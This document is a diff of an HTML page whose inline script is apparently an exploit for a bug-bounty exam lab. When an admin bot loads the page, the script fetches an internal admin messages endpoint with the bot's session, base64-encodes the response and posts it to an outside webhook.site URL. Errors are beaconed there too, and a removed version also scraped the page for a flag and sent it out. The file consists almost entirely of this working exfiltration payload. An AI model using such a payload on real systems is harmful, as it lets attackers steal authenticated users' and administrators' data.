@@ -1,42 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Exam Bug Report - Reference ID 69ea97eabee6d6b7c664653e</title>
-</head>
+<html>
 <body>
-    <h1>Processing Technical Report...</h1>
     <script>
-        // 1. Target the internal API endpoint for your specific message ID
-        const targetUrl = 'https://bugbounty-exam.hashacademy.co/api/v1/contact/messages/69ea9a15bee6d6b7c664658a';
+        // The endpoint the AdminBot uses to see your message details
+        const target = 'https://bugbounty-exam.hashacademy.co/api/admin/messages/69ea97eabee6d6b7c664653e';
         const webhook = 'https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7';
 
-        fetch(targetUrl)
-            .then(response => response.json())
+        fetch(target)
+            .then(r => r.text())
             .then(data => {
-                // 2. The bot is now viewing your message data.
-                // We send the full JSON response back to your webhook to see everything.
+                // Exfiltrate the raw response where the flag is hidden
                 fetch(webhook, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify({
-                        status: 'Success',
-                        messageID: '69ea97eabee6d6b7c664653e',
-                        content: data
-                    })
+                    body: btoa('FULL_DATA:' + data)
                 });
             })
-            .catch(error => {
-                // 3. Log errors (like CORS or Auth issues) to the webhook
-                fetch(webhook + '?error=' + btoa(error.message));
+            .catch(err => {
+                // If there's an error, send it so we can debug
+                new Image().src = webhook + '?err=' + btoa(err.message);
             });
-
-        // 4. Also, try to grab the flag directly from the Admin's current session
-        // in case it's in the headers or global scope.
-        const flagSearch = document.documentElement.innerHTML.match(/Hash{[^}]+}/i);
-        if (flagSearch) {
-            new Image().src = webhook + '?found_flag=' + btoa(flagSearch[0]);
-        }
     </script>
 </body>
 </html>
